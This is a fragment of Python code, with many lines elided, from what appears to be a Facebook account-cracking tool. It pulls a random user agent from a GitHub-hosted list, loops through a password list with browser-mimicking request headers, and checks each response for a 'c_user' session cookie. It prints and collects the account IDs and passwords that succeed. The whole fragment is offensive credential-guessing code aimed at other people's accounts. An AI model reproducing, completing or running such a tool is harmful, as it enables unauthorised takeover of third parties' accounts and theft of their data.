...
useragent_list = get("https://raw.githubusercontent.com/itx-xd/data/main/ua.txt").text
useragent_list = useragent_list.splitlines()
useragent = choice(useragent_list)
    ...
    try:
        ...
        for fikr in passlist:
            ...
            hed2 = ({
                ...
                'referer':'https://p.facebook.com/?tbua=1',
                'pragma': 'no-cache',
                'priority': 'u=0',
            ...
            if 'c_user' in cookies:
                ...
                print('\r\r\033[1;36m[2F] '+ids+' | '+pas+'\033[1;97m')
                tf.append(ids)
